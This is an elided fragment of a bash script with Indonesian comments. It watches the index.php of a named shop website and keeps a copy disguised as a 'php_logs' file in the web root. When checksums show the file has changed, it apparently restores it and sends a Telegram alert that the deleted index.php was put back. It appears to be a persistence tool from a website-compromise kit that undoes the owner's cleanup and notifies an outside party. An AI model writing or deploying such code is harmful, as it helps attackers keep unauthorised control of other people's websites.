...
INDEX_FILE="/home/ilincaboutique.com/public_html/index.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/ilincaboutique.com/public_html/"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/php_logs"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "https://www.ilincaboutique.com/"
            send_telegram_notification "index.php Di HAPUS. index.php DI KEMBALIKAN." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
